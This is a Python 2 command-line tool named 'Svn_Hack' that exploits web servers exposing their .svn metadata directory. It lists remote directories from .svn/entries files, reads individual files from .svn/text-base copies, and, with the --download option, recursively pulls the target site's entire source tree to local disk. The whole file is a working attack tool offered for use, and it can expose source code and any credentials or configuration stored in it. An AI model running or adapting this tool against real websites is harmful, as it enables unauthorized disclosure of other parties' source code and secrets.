#!coding:utf-8
""" Auther: 加菲猫 """
from optparse import OptionParser 
import urllib
import urlparse
import re
import os
import sys

class Svn_Hack():
    def __init__(self):
        self.root_dir = None
        self.url = None

    def List_Dic(self):
        res=urllib.urlopen(self.url).read()

        dic = re.findall(r'\n(.*?)\ndir',res)
        for i in dic:
            if i == '':
                continue
            print '\033[1;34;40m%s' % i
        print '\033[0m--------'

        for i in re.findall(r'\n(.*?)\nfile',res):
            print i 

    def Read_File(self):
        res=urllib.urlopen(self.url).read()
        print res

    def is_exists(self, Dir):
        if not os.path.exists(Dir):
            return True
        else:
            return False
        
    def Fetch_Dic(self, entries_url):
        res=urllib.urlopen(entries_url).read()
        try:
            dic = re.findall(r'\n(.*?)\ndir',res)
            dic.remove('')
        except Exception:
            dic = []
      
        next_url_list = []
        if len(dic) != 0:
            for i in dic:
                 url = entries_url.split('.svn')[0]+i+'/.svn/entries'
                 path = "./"+self.root_dir+urlparse.urlparse(url).path
                 if self.is_exists(path):
                     os.makedirs(path)

                 next_url_list.append(url)

        return next_url_list


    def DownFile(self, entries_url):
        res=urllib.urlopen(entries_url).read()
        try:
            dic = re.findall(r'\n(.*?)\nfile',res)
        except Exception:
            dic = []

        if len(dic) != 0:
            for i in dic:
                 url=entries_url.split('.svn')[0]+i
                 path = "./"+self.root_dir+urlparse.urlparse(url).path
                 res=urllib.urlopen(url).read()
                 print "[Fetch] %s" % url
                 with open(path,'a+') as f:
                     f.write(res)

    def DownSite(self):
        res=urllib.urlopen(self.url).read()

        self.root_dir = urlparse.urlparse(self.url).netloc

        # 初始化下载目录
        if self.is_exists(self.root_dir):
            os.mkdir(self.root_dir)

        # 获取所有svn目录
        dir_list = []
        dic = re.findall(r'\n(.*?)\ndir',res)

        print len(dic)

        for i in dic:
            # 空目录跳过
            if i == '':
                continue

            # 循环下载所有目录
            if self.is_exists(self.root_dir+"/"+i):
                os.mkdir(self.root_dir+"/"+i)
                entries_url = self.url.split('.svn')[0]+i+'/.svn/entries'
                dir_list.append(entries_url)
                while len(dir_list) != 0:
                    next_dic = self.Fetch_Dic(dir_list.pop())
                    if len(next_dic) != 0:
                        for url in next_dic:
                            dir_list.append(url)
                            self.DownFile(url)
                            #print url, len(dir_list)

            #sys.exit()

        # 下载根目录文件
        self.DownFile(self.url)
                
    def audit(self):

        parser = OptionParser() 
        parser.add_option("-u", "--url", dest="url",
                      help="add a svn url.", metavar="Url")
        parser.add_option("-d", "--dic", dest="dirname",  
                      help="list a directory.", metavar="Dic")  
        parser.add_option("-r", "--read", dest="readfile",
                      help="read a file.")  
        parser.add_option("--download", dest="download",
                      action='store_true',
                      help="download the entire station.")

        (options, args) = parser.parse_args()  

        if options.url != None:
            self.url = options.url

            if options.dirname != None:
                self.url = self.url.split('.svn')[0]+options.dirname+'/.svn/entries'

            if options.download == True:
                self.DownSite()
                sys.exit()

            if options.readfile != None:
                filename = options.readfile
                self.url  = self.url.split('.svn')[0]+'/.svn/text-base/'+options.readfile+'.svn-base'
                self.Read_File()
            else:
                self.List_Dic()

        else:
            parser.print_help() 
        

if __name__ == '__main__':
    svn = Svn_Hack()
    svn.audit()

